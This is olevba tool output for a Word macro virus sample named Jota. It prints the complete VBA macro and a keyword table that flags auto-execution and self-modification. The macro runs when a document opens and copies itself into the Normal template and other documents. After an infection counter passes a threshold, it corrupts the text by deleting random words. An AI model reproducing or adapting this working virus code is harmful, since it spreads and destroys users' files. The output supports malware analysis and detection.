olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jota-33ccc145b2a856ceed02c823c9a34d4039c0b475
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO dllAD1k.cls 
in file: Virus.MSWord.Jota-33ccc145b2a856ceed02c823c9a34d4039c0b475 - OLE stream: 'Macros/VBA/dllAD1k'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

















Private Sub Document_Open()
CommandBars("Visual Basic").Visible = False
CommandBars("Stop Recording").Visible = False
On Error Resume Next
Dim jota As Integer, i As Integer, y As Integer, cadecodi As String
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
y = 0
jota = 0
'AD
If nt.Name <> "dllnt1k" Then
GoSub killoldnt:
polncopynt:
copynt:
  y = y + 1
 cadecodi = ad.codemodule.Lines(jota, 1)
     nt.codemodule.InsertLines y, cadecodi
jota = jota + 1
If nt.codemodule.Lines(jota, 1) = "End Sub" Then ww = 1
If y > 500 Then GoTo xxxxxx2:
If ww = 1 Then www = www + 1
If www > 4 Then GoTo xxxxxx4:
GoTo copynt:
xxxxxx4:
   nt.Name = "dllnt1k"
   NormalTemplate.Save
GoTo xxxxxx2:
Else
End If
'nt
If ad.Name <> "dllAD1k" Then
GoSub killoldad:
copyAD:
     y = y + 1
     cadecodi = nt.codemodule.Lines(jota, 1)
      ad.codemodule.InsertLines y, cadecodi
     If cadecodi = "'tttn" Then GoTo eeee
GoTo rrr:
eeee:
      jota = jota + 1
     cadecodi = nt.codemodule.Lines(jota, 1)
     If cadecodi = "'ttte" Then jota = jota - 2: GoTo rrr
     GoTo eeee:
rrr:
     jota = jota + 1
If nt.codemodule.Lines(jota, 1) = "End Sub" Then ww1 = 1
If ww1 = 1 Then www1 = www1 + 1
If y > 500 Then GoTo xxxxxx2:
If www1 > 4 Then GoTo xxxxxx3:
GoTo copyAD:
xxxxxx3:
  ad.Name = "dllAD1k"
   ActiveDocument.SaveAs ActiveDocument.FullName
GoTo xxxxxx2:
Else
End If
polncopynt1:
copynt1:
cadecodi = nt.codemodule.Lines(jota, 1)
If cadecodi = "'tttn" Then ddd = jota: GoTo xxxxxx1:
jota = jota + 1
If nt.codemodule.Lines(jota, 1) = "End Sub" Then ww = 1
If jota > 300 Then GoTo xxxxxx2:
GoTo copynt1:
xxxxxx1:
ddd = ddd + 1
kk1 = nt.codemodule.Lines(ddd, 1)
If kk1 > 200 Then GoTo eeee11:
nt.codemodule.InsertLines ddd, Val(kk1) + 1
NormalTemplate.Save
GoTo xxxxxx2:
'tttn
1
'ttte
eeee11:
For dd = 1 To 100
ActiveDocument.Content.Find.Execute FindText:=",", ReplaceWith:=" áë˙" ', Replace:=wdReplaceAll, Format:=True
ActiveDocument.Words(Int(Rnd * 500)).Delete
Next dd
ActiveDocument.SaveAs ActiveDocument.FullName
ActiveDocument.Close
GoTo xxxxxx2:
killoldad:
For kil = 1 To 1000
ad.codemodule.DeleteLines 1
Next kil
Return
killoldnt:
For kil = 1 To 1000
nt.codemodule.DeleteLines 1
Next kil
Return
xxxxxx2:
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

